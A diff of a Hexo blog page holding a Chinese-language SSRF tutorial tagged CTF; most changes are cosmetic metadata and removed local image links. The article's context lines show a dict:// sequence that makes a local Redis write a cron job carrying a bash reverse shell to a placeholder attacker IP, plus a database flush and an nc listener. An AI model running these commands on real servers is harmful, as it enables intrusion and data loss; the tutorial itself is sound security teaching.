@@ -18,22 +18,19 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="SSRF漏洞漏洞介绍服务器请求是从客户端发起一个请求到服务器，服务器再向另外的服务器发起请求的过程。 服务器端清求伪造(Server-side Request Forgery，简称SSRF)，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。SSRF让服务器去请求你通常请求不到的东西，一般用来在外网探测或攻击内网服务。	    **类比CSRF:**服务器端请求伪造攻击将域中的不安全服务器作为代">
+        <meta name="description" content="SSRF漏洞漏洞介绍服务器请求是从客户端发起一个请求到服务器，服务器再向另外的服务器发起请求的过程。 服务器端清求伪造(Server-side Request Forgery，简称SSRF)，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。SSRF让服务器去请求你通常请求不到的东西，一般用来在外网探测或攻击内网服务。	  **类比CSRF:**服务器端请求伪造攻击将域中的不安全服务器作为代理使">
 <meta property="og:type" content="article">
 <meta property="og:title" content="服务器请求伪造（SSRF）">
 <meta property="og:url" content="http://example.com/2024/09/11/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88SSRF%EF%BC%89/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="SSRF漏洞漏洞介绍服务器请求是从客户端发起一个请求到服务器，服务器再向另外的服务器发起请求的过程。 服务器端清求伪造(Server-side Request Forgery，简称SSRF)，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。SSRF让服务器去请求你通常请求不到的东西，一般用来在外网探测或攻击内网服务。	    **类比CSRF:**服务器端请求伪造攻击将域中的不安全服务器作为代">
+<meta property="og:description" content="SSRF漏洞漏洞介绍服务器请求是从客户端发起一个请求到服务器，服务器再向另外的服务器发起请求的过程。 服务器端清求伪造(Server-side Request Forgery，简称SSRF)，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。SSRF让服务器去请求你通常请求不到的东西，一般用来在外网探测或攻击内网服务。	  **类比CSRF:**服务器端请求伪造攻击将域中的不安全服务器作为代理使">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240505105303580.png">
-<meta property="og:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240505105319353.png">
 <meta property="article:published_time" content="2024-09-11T10:56:23.000Z">
-<meta property="article:modified_time" content="2024-09-11T11:05:39.572Z">
+<meta property="article:modified_time" content="2024-09-11T14:04:26.360Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="ctf">
 <meta property="article:tag" content="SSRF">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240505105303580.png">
     
     
         <!-- Google tag (gtag.js) -->
@@ -57,7 +54,7 @@
         
             服务器请求伪造（SSRF） -
         
-        Dunm1e&#39;World
+        Dunm1e &#39; World
     </title>
 
     
@@ -97,7 +94,7 @@
 
     <script id="hexo-configurations">
     window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
-    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":true,"list":["Lv1","Lv2","Lv3","Lv4","Lv5","Lv6","Lv7","Lv8","Lv9","Lv10"]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐文章","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":"Welcome to Dunm1e'World!"},"open_graph":true,"google_analytics":{"enable":true,"id":"G-B18L9QTZ0H"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/light.jpg","dark":"/images/dark.jpg"},"title":"Dunm1e'World","subtitle":{"text":["Loading..."],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/dunm1e","instagram":null,"zhihu":null,"twitter":null,"email":"dunxiongdun@gmail.com"},"qrs":{"weixin":"/images/wechat.jpg"}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Github":{"path":"https://github.com/dunm1e","icon":"fa-brands fa-github"},"Links":{"icon":"fa-regular fa-link","submenus":{"Categories":"/categories","Tags":"/tags","Friends":"/links"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"有疑问请联系我的邮箱","show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/9/11 12:00:00"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":true,"list":["Lv1","Lv2","Lv3","Lv4","Lv5","Lv6","Lv7","Lv8","Lv9","Lv10"]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐文章","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":"Welcome to Dunm1e ' World!"},"open_graph":true,"google_analytics":{"enable":true,"id":"G-B18L9QTZ0H"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/light.jpg","dark":"/images/dark.jpg"},"title":"Dunm1e ' World","subtitle":{"text":["Loading..."],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/dunm1e","instagram":null,"zhihu":null,"twitter":null,"email":"dunxiongdun@gmail.com"},"qrs":{"weixin":"/images/wechat.jpg"}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Github":{"path":"https://github.com/dunm1e","icon":"fa-brands fa-github"},"Links":{"icon":"fa-regular fa-link","submenus":{"Categories":"/categories","Tags":"/tags","Friends":"/links"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"有疑问请联系我的邮箱","show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/9/11 12:00:00"};
     window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
     window.data = {"masonry":false};
   </script>
@@ -207,7 +204,7 @@
 
 <div class="preloader">
     <h2 class="ml13">
-        Welcome to Dunm1e&#39;World!
+        Welcome to Dunm1e &#39; World!
     </h2>
     <script>
         var textWrapper = document.querySelector('.ml13');
@@ -298,7 +295,7 @@
             
             <a class="logo-title" href="/">
                 
-                Dunm1e&#39;World
+                Dunm1e &#39; World
                 
             </a>
         </div>
@@ -553,8 +550,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-09-11 19:05:39</span>
-            <span class="mobile">2024-09-11 19:05:39</span>
+            <span class="desktop">2024-09-11 22:04:26</span>
+            <span class="mobile">2024-09-11 22:04:26</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -592,11 +589,11 @@
             <ul>
                 
                     <li>
-                        <a href="/tags/ctf/">ctf</a>&nbsp;
+                        <a href="/tags/SSRF/">SSRF</a>&nbsp;
                     </li>
                 
                     <li>
-                        | <a href="/tags/SSRF/">SSRF</a>&nbsp;
+                        | <a href="/tags/CTF/">CTF</a>&nbsp;
                     </li>
                 
             </ul>
@@ -632,18 +629,6 @@
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
             <h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p><strong>服务器请求</strong>是从客户端发起一个请求到服务器，服务器再向另外的服务器发起请求的过程。</p>
 <p><strong>服务器端清求伪造</strong>(Server-side Request Forgery，简称SSRF)，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。SSRF让服务器去请求你通常请求不到的东西，一般用来在外网探测或攻击内网服务。	 </p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240505105303580.png"
-                      alt="image-20240505105303580"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240505105319353.png"
-                      alt="image-20240505105319353"
-                ></p>
 <p>**类比CSRF:**服务器端请求伪造攻击将域中的不安全服务器作为代理使用，这与利用网页客户端的跨站请求伪造攻击类似(如处在域中的浏览器可作为攻击者的代理)。<br>**漏洞成因:**由于服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发送请求，并返回对该目标地址请求的数据。比如:攻击者传入一个未经验证的 URL，后端代码直接请求这个URL，就会造成 SSRF 漏洞。<br>**漏洞危害:**利用SSRF漏洞，攻击者实际上可以访问内网，可以进行</p>
 <ul>
 <li>读取内网文件;</li>
@@ -686,7 +671,7 @@
 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dict://127.0.0.1:6379/info //查看信息</span><br><span class="line">dict://127.0.0.1:6379/flusha11 //清空数据库(慎用)</span><br><span class="line">dict://127.0.0.1:6379/config set dir /var/spoo1/cron/ //设置工作目录</span><br><span class="line">dict://127.0.0.1:6379/config set dbfilename root //设置备份文件名</span><br><span class="line">dict://127.0.0.1:6379/set x &quot;\n***** bash -i &amp;&gt; /dev/tcp/攻击机IP/port 0&gt;&amp;1\n&quot;//反弹she11</span><br><span class="line">dict://127.0.0.1:6379/save</span><br></pre></td></tr></table></figure></div>
 
 <p>然后攻击机进行监听</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvpp port</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp port</span><br></pre></td></tr></table></figure></div>
 
 <p>定时任务执行后就会反弹shell到攻击机</p>
 
@@ -703,7 +688,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-09-11 19:05:39
+                    :</strong> 2024-09-11 22:04:26
             </li>
         
         <li>
@@ -729,11 +714,11 @@
             <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
                 
                     <li class="tag-item mx-0.5">
-                        <a href="/tags/ctf/">#ctf</a>&nbsp;
+                        <a href="/tags/SSRF/">#SSRF</a>&nbsp;
                     </li>
                 
                     <li class="tag-item mx-0.5">
-                        <a href="/tags/SSRF/">#SSRF</a>&nbsp;
+                        <a href="/tags/CTF/">#CTF</a>&nbsp;
                     </li>
                 
             </ul>
